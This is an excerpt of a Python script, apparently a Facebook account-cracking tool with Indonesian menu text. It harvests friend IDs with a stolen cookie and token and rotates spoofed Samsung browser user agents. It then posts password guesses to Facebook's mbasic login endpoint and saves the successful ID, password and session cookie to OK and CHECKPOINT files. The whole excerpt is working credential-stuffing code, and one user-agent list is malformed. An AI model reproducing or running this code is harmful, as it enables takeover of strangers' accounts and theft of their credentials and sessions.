...
for xd in range(1000):
   ...
   ua = random.choice(["SAMSUNG SM-J210Y','SAMSUNG SM-E203Y','SAMSUNG SM-T87V','SAMSUNG SM-D738P','SAMSUNG SM-W748D','SAMSUNG SM-Z794M','SAMSUNG SM-K144T','SAMSUNG SM-L372N','SAMSUNG SM-B588T','SAMSUNG SM-R584V','SAMSUNG SM-R108Z;]"])
   ...
   strvoppo = f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G991W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
   strvredmi = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
   strvoppo1 = f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G970N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
   strvinfinix = f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
   faisal = f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T970) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
   faisal1 = f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A516B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
   faisal2 = f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
   faisal3 = f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
   faisal4 = f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A750N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
   faisal5 = f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
...
def login():
	...
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.2 Chrome/75.0.3770.143 Safari/537.36"}
...
def menu():
	...
	print('')
	ler()
	print(f'┌─[{h}1\x1b[1;97m] Dump Id Publik ')
...
def dump(idt,fields,cookie,token):
	try:
		headers = {
			...
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3865.120 Safari/537.36",
		...
		for i in url["friends"]["data"]:
			...
			sys.stdout.write(f"\r└─ Mulung : {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
...
def setting():
	...
	print(f'┌─[{h}2\x1b[1;97m] Validate ')
	print(f'┌─[{h}3\x1b[1;97m] Mbasic ')
...
def passwrd():
	...
	print(f'{N}├─{h}● {N}GACOR : {h}%s '%(ok))
	print(f'{N}└─{h}● {N}KURANG GACOR : {k}%s{x} '%(cp))
...
def crack(idf,pwv):
	...
	fff = '%'
	print(f'\r%s%s/%s GACOR : %s GAK GACOR : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
'bi_xrwh': 0
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cp+=1
				os.popen('/sdcard/3/CHECKPOINT.mp3')
				print(f'\r{K}┌─➢●CHECKPOINT')
				print(f'\r┌─ {P}Tahun       : {K}{tahun}{N}')
				print(f'\r├─ {P}Username : {K}{idf}{N}')
				print(f'\r├─ {P}Password  : {K}{pw}{N}')
				print(f'\r└─ {P}UserAgent  : {K}{ua}{N}')
				open('CP/'+cpc,'a').write(tahun+'|'+idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				os.popen('/sdcard/3/OK.mp3')
				...
				open('OK/'+okc,'a').write(tahun+'|'+idf+'|'+pw+'|'+kuki+'\n')
				break
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',params=params,data=date,headers=head,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f'\r{P} => {M}{idf}|{pw} => {nmf} => {url} => {tahun(idf)}{N}')
				cp+=1
				os.popen('/sdcard/3/CHECKPOINT.mp3')
